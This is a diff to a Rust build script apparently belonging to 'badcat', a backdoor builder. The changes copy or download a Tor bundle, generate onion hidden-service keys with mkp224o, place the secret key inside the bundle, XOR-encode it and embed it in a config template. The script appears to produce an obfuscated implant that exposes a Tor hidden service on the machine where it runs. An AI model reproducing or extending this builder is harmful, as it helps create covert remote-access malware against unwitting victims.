@@ -1,5 +1,5 @@
 use std::{fs, error, collections, process};
-use std::path::Path;
+use std::path::{Path, PathBuf};
 
 use badcat_lib::{xor, http};
 
@@ -31,8 +31,10 @@ fn main() -> Result<(), Box<dyn error::Error>> {
     } else {
         platform_tor_dir = &setting.linux_dir;
 
-        torrc += "\nControlSocketsGroupWritable 1";
-        torrc += "\nControlSocket @{CTRL_SOCKET}";
+        torrc += r#"
+ControlSocketsGroupWritable 1
+ControlSocket @{CTRL_SOCKET}
+"#;
     }
 
     let tor_dir = Path::new(&platform_tor_dir)
@@ -58,13 +60,11 @@ fn main() -> Result<(), Box<dyn error::Error>> {
 
     replacements.insert("@{ENC_TOR_BUNDLE}", bundle_tor(&setting)?);
 
-    match replace_settings(
-        &String::from(CFG_TEMPLATE),
+    replace_settings(
+        CFG_TEMPLATE,
+        CFG_DESTINATION,
         &replacements
-    ) {
-        Ok(data) => fs::write(CFG_DESTINATION, data)?,
-        Err(error) => return Result::Err(error)
-    };
+    )?;
 
     Ok(())
 }
@@ -72,15 +72,22 @@ fn main() -> Result<(), Box<dyn error::Error>> {
 fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
     let url = if setting.is_tor_for_windows { &setting.windows_url } else { &setting.linux_url };
 
-    let dir;
     let tmp_dir;
 
     if url.starts_with("file://") {
-        dir = url.strip_prefix("file://").unwrap();
+        let local_dir = url.strip_prefix("file://").unwrap();
+        tmp_dir = tempfile::tempdir()?;
+        
+        badcat_lib::fs::copy_dir(
+            &PathBuf::from(local_dir),
+            &tmp_dir.path().to_path_buf()
+        )?;
     } else {
         tmp_dir = download_and_extract_tor(&url, setting)?;
-        dir = tmp_dir.path().to_str().unwrap();
     }
+
+    let dir = tmp_dir.path().to_str().unwrap();
+    let hs_addr = generate_hs_secrets(dir)?;
 
     let mut archive = tar::Builder::new(Vec::new());
     archive.append_dir_all(&setting.name, &dir)?;
@@ -89,6 +96,37 @@ fn bundle_tor(setting: &BuildSetting) -> Result<String, Box<dyn error::Error>> {
 
     let bundle = xor::encode_bytes(&setting.key, &data);
     Ok(bundle)
+}
+
+fn generate_hs_secrets(
+    to_dir: &str,
+) -> Result<String, Box<dyn error::Error>> {
+    let temp_dir = tempfile::tempdir()?;
+
+    let proc = process::Command::new("mkp224o")
+        .args(["-n", "1", "-d", temp_dir.path().to_str().unwrap(), "-q", "a"])
+        .output()?;
+
+    if !proc.status.success() {
+        println!("{}", String::from_utf8(proc.stderr)?);
+        return Err(String::from("problem generating hidden service keys").into());
+    }
+
+    let output = String::from_utf8(proc.stdout)?;
+    let hs_addr = output.strip_suffix("\n").unwrap();
+
+    // mkp224o stores the files with this structure
+    let secrets_dir = temp_dir.path().join(hs_addr);
+
+    let dir = Path::new(to_dir).join("App");
+
+    fs::copy(secrets_dir.join("hostname"), dir.join("hostname"))?;
+    fs::copy(secrets_dir.join("hs_ed25519_public_key"), dir.join("hs_ed25519_public_key"))?;
+    fs::copy(secrets_dir.join("hs_ed25519_secret_key"), dir.join("hs_ed25519_secret_key"))?;
+
+    fs::copy(secrets_dir.join("hostname"), Path::new("../hostname"))?;
+
+    Ok(String::from(hs_addr))
 }
 
 fn download_and_extract_tor(
@@ -140,16 +178,19 @@ fn load_settings() -> Result<json::JsonValue, Box<dyn error::Error>> {
 }
 
 fn replace_settings(
-    template: &String,
+    template: &str,
+    destinaion: &str,
     replacements: &collections::HashMap<&str, String>
-) -> Result<String, Box<dyn error::Error>> {
+) -> Result<(), Box<dyn error::Error>> {
     let mut config_source = fs::read_to_string(template)?;
 
     for (pattern, content) in replacements {
         config_source = config_source.replace(pattern, &content);
     }
 
-    Ok(config_source)
+    fs::write(destinaion, config_source)?;
+
+    Ok(())
 }
 
 fn parse_settings(raw: &json::JsonValue) -> BuildSetting {
